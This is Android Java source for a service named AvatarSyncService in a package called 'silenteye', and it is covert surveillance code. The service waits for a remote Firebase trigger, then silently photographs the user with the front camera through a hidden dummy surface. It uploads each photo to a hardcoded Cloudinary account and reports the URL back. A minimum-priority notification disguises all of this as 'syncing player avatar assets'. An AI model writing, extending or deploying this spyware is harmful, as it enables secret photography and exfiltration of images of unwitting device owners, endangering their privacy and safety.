package com.silenteye;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.cloudinary.Cloudinary;
import com.cloudinary.android.MediaManager;
import com.cloudinary.android.callback.ErrorInfo;
import com.cloudinary.android.callback.UploadCallback;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class AvatarSyncService extends Service {

    private static final String TAG = "AvatarSyncService";
    private static final int NOTIFICATION_ID = 303;
    private static final String CHANNEL_ID = "AvatarSyncChannel";

    // --- CLOUDINARY CONFIGURATION ---
    private static final String CLOUDINARY_CLOUD_NAME = "deefvrxey";
    private static final String CLOUDINARY_UPLOAD_PRESET = "silent-eye";

    private DatabaseReference baseRef;
    private ValueEventListener triggerListener;

    private CameraManager cameraManager;
    private HandlerThread cameraThread;
    private Handler cameraHandler;

    private boolean isCapturing = false;

    @Override
    public void onCreate() {
        super.onCreate();

        // Initialize Cloudinary
        try {
            Map<String, String> config = new HashMap<>();
            config.put("cloud_name", CLOUDINARY_CLOUD_NAME);
            MediaManager.init(this, config);
        } catch (Exception e) {
            Log.e(TAG, "Cloudinary already initialized or failed", e);
        }

        createNotificationChannel();
        // Path: clients/{CLIENT_ID} — all sub-nodes branch from here
        baseRef = ClientManager.getClientRef();

        cameraThread = new HandlerThread("CameraBackground");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createNotification());

        // Listen for remote trigger
        triggerListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean shouldTake = snapshot.getValue(Boolean.class);
                if (shouldTake != null && shouldTake && !isCapturing) {
                    isCapturing = true;
                    // Reset to false immediately to prevent loop
                    baseRef.child("takePhoto").setValue(false);
                    takeFrontPhoto();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        };

        baseRef.child("takePhoto").addValueEventListener(triggerListener);

        return START_STICKY;
    }

    private void takeFrontPhoto() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission missing");
            isCapturing = false;
            return;
        }

        try {
            String frontCameraId = null;
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = cameraId;
                    break;
                }
            }

            if (frontCameraId == null) {
                Log.e(TAG, "No front camera found");
                isCapturing = false;
                return;
            }

            cameraManager.openCamera(frontCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    captureRawImage(camera);
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    isCapturing = false;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    isCapturing = false;
                }
            }, cameraHandler);

        } catch (Exception e) {
            Log.e(TAG, "Failed to prep camera", e);
            isCapturing = false;
        }
    }

    private void captureRawImage(CameraDevice camera) {
        try {
            // Need a dummy surface texture for some devices to allow capture session
            SurfaceTexture dummyTex = new SurfaceTexture(10);
            dummyTex.setDefaultBufferSize(640, 480);
            Surface dummySurface = new Surface(dummyTex);

            ImageReader imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);

                    File file = new File(getCacheDir(), "avatar_sync_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream output = new FileOutputStream(file);
                    output.write(bytes);
                    output.close();

                    uploadToCloudinary(file);

                } catch (Exception e) {
                    Log.e(TAG, "Error writing image", e);
                } finally {
                    if (image != null) image.close();
                    camera.close();
                    isCapturing = false;
                }
            }, cameraHandler);

            camera.createCaptureSession(Arrays.asList(dummySurface, imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(dummySurface);
                        builder.addTarget(imageReader.getSurface());
                        // Silent shutter
                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

                        session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                            @Override
                            public void onCaptureCompleted(@NonNull CameraCaptureSession session, @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
                                super.onCaptureCompleted(session, request, result);
                                Log.d(TAG, "Capture completed");
                            }
                        }, cameraHandler);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                        camera.close();
                        isCapturing = false;
                    }
                }

                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    camera.close();
                    isCapturing = false;
                }
            }, cameraHandler);

        } catch (CameraAccessException e) {
            e.printStackTrace();
            camera.close();
            isCapturing = false;
        }
    }

    private void uploadToCloudinary(File file) {
        if (CLOUDINARY_UPLOAD_PRESET.equals("YOUR_UPLOAD_PRESET")) {
             Log.e(TAG, "Cloudinary upload preset not configured!");
             return;
        }

        MediaManager.get().upload(file.getAbsolutePath())
                .unsigned(CLOUDINARY_UPLOAD_PRESET)
                .callback(new UploadCallback() {
                    @Override
                    public void onStart(String requestId) {
                    }

                    @Override
                    public void onProgress(String requestId, long bytes, long totalBytes) {
                    }

                    @Override
                    public void onSuccess(String requestId, Map resultData) {
                        String url = (String) resultData.get("secure_url");
                        Log.d(TAG, "Upload success: " + url);
                        
                        Map<String, Object> update = new HashMap<>();
                        update.put("lastAvatarSync", url);
                        update.put("lastAvatarTimestamp", System.currentTimeMillis());
                        baseRef.updateChildren(update);

                        file.delete();
                    }

                    @Override
                    public void onError(String requestId, ErrorInfo error) {
                        Log.e(TAG, "Upload failed: " + error.getDescription());
                        file.delete();
                    }

                    @Override
                    public void onReschedule(String requestId, ErrorInfo error) {
                    }
                }).dispatch();
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Avatar Sync")
                .setContentText("Syncing player avatar assets...")
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Avatar Synchronization",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (cameraThread != null) {
            cameraThread.quitSafely();
        }
        if (baseRef != null && triggerListener != null) {
            baseRef.child("takePhoto").removeEventListener(triggerListener);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
